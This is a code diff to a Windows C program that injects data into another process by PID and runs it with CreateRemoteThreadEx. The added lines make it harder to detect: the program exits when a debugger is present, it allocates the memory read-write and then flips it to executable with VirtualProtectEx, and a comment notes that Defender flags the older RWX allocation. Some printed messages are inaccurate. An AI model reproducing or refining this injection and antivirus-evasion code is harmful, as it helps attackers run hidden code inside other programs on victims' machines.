@@ -16,6 +16,10 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 
+	if (IsDebuggerPresent() != 0) {
+		return EXIT_FAILURE;
+	}
+
 	dwPID = atoi(argv[1]); //Convert the user supplied pid to an int
 
 	//Get handle to process baesd on user supplied PID
@@ -47,7 +51,7 @@ int main(int argc, char* argv[]) {
 		NULL,						//Let windows decide where to alloc the memory
 		szMY_Data,					//Size of cString
 		MEM_COMMIT | MEM_RESERVE,	//Commit and reserve in one step 
-		PAGE_EXECUTE_READWRITE);	//Defender hates this
+		PAGE_READWRITE);			//Memory Constant 
 	
 	//if NULL returned something didnt work 
 	if (myAllocation == NULL) {
@@ -85,6 +89,20 @@ int main(int argc, char* argv[]) {
 		printf("[!] Failed to write data into target process memory: 0x%p\n", GetLastError());
 
 	}
+
+	//change memory protections here 
+	DWORD flOldProtect = 0;		//holds the old memory constant 
+
+	BOOL changePerms = VirtualProtectEx(handle, myAllocation, szMY_Data, PAGE_EXECUTE, &flOldProtect);
+
+	if (changePerms == 0) {
+		printf("[!] Failed to change memory permissions: 0x%p\n", GetLastError);
+	}
+	else {
+		printf("[+] Changed memory permisions to RWX :)\n");
+	}
+
+
 
 	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
 	if (cThread == NULL) {
